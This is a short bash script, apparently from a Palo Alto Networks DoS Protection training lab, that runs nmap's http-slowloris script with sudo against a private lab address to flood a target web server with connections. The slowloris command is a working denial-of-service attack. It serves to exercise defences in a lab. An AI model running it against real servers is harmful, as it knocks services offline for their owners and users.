#!/bin/bash
#
# May 4, 2020
# Bill Claunch
# Palo Alto Networks
#
# Script to open numerous simultaneous TCP sessions to target host. Used during DoS Protection lab.

clear
echo "    ###################################################" | pv -qL 120
echo "    ##    Generate Multiple Connections to Target    ##" | pv -qL 120
echo "    ###################################################" | pv -qL 120
echo ""
echo "    This script opens multiple TCP connections to the target server." | pv -qL 120
echo ""
echo -n "    Press ENTER to start or CTRL+C to quit." | pv -qL 120
                read anykey
echo ""
echo "    ############################################################" | pv -qL 120
echo "    ##    Allow this script to run for about three minutes    ##" | pv -qL 120
echo "    ############################################################" | pv -qL 120
echo ""
echo "    Then use CTRL+C to stop the process." | pv -qL 120
echo ""
echo "    ===============================" | pv -qL 120
echo""
echo "    sudo nmap --script http-slowloris --max-parallelism 10 192.168.50.80" | pv -qL 120
sudo nmap --script http-slowloris --max-parallelism 10 192.168.50.80
echo ""
echo "    Process complete." | pv -qL 120
echo ""
                echo -n "Press ENTER to close this window." | pv -qL 120
                read anykey
